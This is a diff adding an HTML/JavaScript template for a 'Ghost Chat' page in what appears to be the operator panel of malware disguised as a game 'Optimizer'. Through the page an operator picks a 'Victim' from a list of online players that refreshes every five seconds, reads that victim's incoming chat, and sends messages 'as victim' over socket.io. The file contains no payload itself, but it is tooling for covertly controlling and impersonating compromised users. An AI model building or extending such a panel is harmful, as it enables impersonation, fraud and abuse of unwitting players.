@@ -1,0 +1,169 @@
+<!-- templates/chat.html -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Ghost Chat | Optimizer</title>
+    <link href="/static/css/style.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+    <script>if (!localStorage.getItem("token")) window.location.href = "/";</script>
+    <style>
+        body {
+            background: #050505;
+            color: white;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+        }
+
+        #chat-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        #messages {
+            flex: 1;
+            overflow-y: auto;
+            margin-bottom: 20px;
+            padding: 10px;
+        }
+
+        .msg {
+            margin-bottom: 8px;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .msg.in {
+            background: rgba(0, 255, 157, 0.1);
+            border-left: 3px solid #00ff9d;
+        }
+
+        .msg.out {
+            background: rgba(88, 101, 242, 0.1);
+            border-right: 3px solid #5865f2;
+            text-align: right;
+        }
+
+        .controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #333;
+            padding: 12px;
+            color: white;
+            border-radius: 6px;
+            outline: none;
+        }
+
+        button {
+            background: #00ff9d;
+            color: black;
+            border: none;
+            padding: 0 20px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        select {
+            background: #111;
+            color: white;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="chat-container">
+        <h2>💬 Ghost Chat</h2>
+        <select id="player-select">
+            <option value="">Select Victim...</option>
+        </select>
+        <div id="messages" class="glass"></div>
+        <div class="controls">
+            <input type="text" id="msg-input" placeholder="Type message as victim...">
+            <button onclick="send()">SEND</button>
+        </div>
+    </div>
+    <script>
+        const socket = io();
+        const msgs = document.getElementById('messages');
+        const select = document.getElementById('player-select');
+        let currentPlayer = '';
+
+        // Auth
+        const token = localStorage.getItem('token');
+        socket.emit('authenticate', { token: token });
+
+        socket.on('authenticated', () => {
+            // Request active guardians? For now we wait for manual select or updates
+            // Ideally we get a list of online players via API or socket event
+        });
+
+        // Listen for incoming chat (from victim)
+        socket.on('chat_message', (data) => {
+            if (data.player === currentPlayer || currentPlayer === '') {
+                addMsg(data.player, data.message, 'in');
+            }
+        });
+
+        function send() {
+            const txt = document.getElementById('msg-input').value;
+            currentPlayer = select.value;
+            if (!currentPlayer || !txt) return;
+
+            socket.emit('send_chat', { player: currentPlayer, message: txt });
+            addMsg('You', txt, 'out');
+            document.getElementById('msg-input').value = '';
+        }
+
+        function addMsg(user, text, type) {
+            const div = document.createElement('div');
+            div.className = 'msg ' + type;
+            div.innerText = user + ': ' + text;
+            msgs.appendChild(div);
+            msgs.scrollTop = msgs.scrollHeight;
+        }
+
+        // Fetch online players to populate select
+        async function loadPlayers() {
+            const res = await fetch('/api/v1/online/list', { headers: { 'Authorization': 'Bearer ' + token } });
+            const data = await res.json();
+            select.innerHTML = '<option value="">Select Victim...</option>';
+            data.forEach(p => {
+                const opt = document.createElement('option');
+                opt.value = p.player;
+                opt.innerText = p.player;
+                select.appendChild(opt);
+            });
+        }
+        loadPlayers();
+        setInterval(loadPlayers, 5000);
+    </script>
+</body>
+
+</html>
